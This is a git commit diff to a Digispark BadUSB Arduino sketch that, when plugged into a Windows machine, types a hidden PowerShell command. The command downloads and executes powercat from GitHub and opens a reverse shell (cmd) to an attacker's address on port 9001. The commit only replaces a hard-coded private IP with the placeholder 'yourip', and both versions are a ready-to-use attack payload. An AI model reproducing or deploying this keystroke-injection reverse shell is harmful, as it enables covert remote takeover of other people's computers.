b10c89465ceb033dc858d1a3140fa61efd9fae93
Mel-Adrien Dodin <65346144+Adrilaw@users.noreply.github.com>
2023-11-15 08:53:56 +0400

    Update Revershell_WinFr.ino

--- Digispark_Script/Revershell_Win/Revershell_WinFr.ino
+++ Digispark_Script/Revershell_Win/Revershell_WinFr.ino
@@ -4,7 +4,7 @@ void setup() {
   DigiKeyboardFr.sendKeyStroke(0);
   DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboardFr.delay(500);
-  DigiKeyboardFr.print("PowerShell.exe -WindowStyle Hidden -Command \"IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1') ;powercat -c 192.168.100.150 -p 9001 -e cmd\"");
+  DigiKeyboardFr.print("PowerShell.exe -WindowStyle Hidden -Command \"IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1') ;powercat -c yourip -p 9001 -e cmd\"");
   DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
   DigiKeyboardFr.delay(1000);
 }
